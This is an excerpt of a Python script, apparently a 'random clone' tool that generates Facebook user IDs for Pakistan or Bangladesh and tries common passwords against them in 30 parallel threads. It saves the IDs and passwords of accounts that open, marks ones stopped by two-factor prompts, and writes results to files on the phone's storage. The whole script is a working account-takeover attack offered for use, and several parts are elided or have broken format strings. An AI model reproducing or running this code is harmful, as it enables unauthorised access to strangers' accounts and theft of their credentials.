...
ha = current.day
today = date.today()
Alien = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
def linex():
    print(f'{RED}______________________________________________________________________')
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mALIEN-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mALIEN-CP.txt' %
              (H, P, str(len(cp))))
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_ALIEN_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f"")
    print(f'{BLUE}______________________________________________________________________')
    print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print(f"{BLUE}______________________________________________________________________")
    print(f"")
    print(f"{B}[01] {WHITE}RANDOM CLONE PAK  M1")
    print(f"{B}[02] {WHITE}RANDOM CLONE BD  M1")
    print(f"")
    print(f"\033[1;91m______________________________________________________________________")
    hamii = input("[√] CHOOSE : ")
    if hamii in ["1","01"]:
...
def password():
    ...
    print(f"")
    print(f"{B}[01] {WHITE} 1 PASSWORD   {GREEN} [ FASTEST⚡]")
    print(f"{B}[02] {WHITE} 2 PASSWORDS  {GREEN} [ FAST  👽]")
    print(f"{B}[03] {WHITE} 5 PASSWORDS  {GREEN} [ SLOW   🐌]")
    linex()
    print("")
    passX = input(f" {RED}CHOOSE{Alien} : ")
    if passX in ['1','01']:
        password1()
    elif passX in ['2','02']:
        password2()
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio ALIEN_OK.mp3")
                print('\r\033[1;32m[ALIEN-OK] '+uid+' [√] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio ALIEN_2F.mp3")
                    print('\r\033[1;34m[ALIEN-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/ALIEN-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio ALIEN_CP.mp3")
                    print(f'\r\033[1;30m[ALIEN-CP] '+uid+' [×] '+ps+ ' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ALIEN ] [%s] \33[1;97m[OK:%s{Alien}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
...
def Tabii2():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\n {WHITE}TOTAL IDZ             : {B}"+tl)
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {B}BANGLADESH ")
        print(f" {WHITE}NUMBER YOU PUT        : {B}"+code)
